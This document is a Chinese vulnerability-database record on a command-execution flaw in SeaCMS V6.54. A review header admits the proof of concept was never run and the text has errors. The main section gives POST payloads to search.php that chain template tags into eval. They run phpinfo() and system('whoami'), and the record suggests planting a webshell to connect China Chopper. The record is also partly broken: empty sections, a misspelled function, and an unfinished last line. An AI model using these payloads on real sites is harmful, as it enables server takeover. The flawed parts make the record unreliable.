---
source: "hatch 补库批 20260928"
product: "SeaCMS6.54"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V6.54 命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：searchpage标签二次替换/旧PHP join及eval，前台入口"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-2fe8614706c6669068483983"
entity_id: "ve-2fe8614706c6669068483983"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：searchpage标签二次替换/旧PHP join及eval，前台入口

- **结论使用边界（1）**：正文末尾连接放入中断；file_put_concents拼错函数且空内容不会自动成shell。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：权限不足分支仍构造任意eval入口，具体限制/预期连接协议未说明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（3）**：多个字段拼eval/$_POST链应保留版本差异，但缺源码/响应/出处。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 海洋CMS V6.54 命令执行

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

path:

    http://0-sec.org/search.php

POST:

    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();

命令执行payload

path:

    http://0-sec.org/search.php

POST:

    searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem("whoami");

权限足够的话，file\_put\_concents("connect.php","")，然后连接菜刀即可

权限不足的话，利用payload构造url：

    http://0-sec.org/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))

连接放入
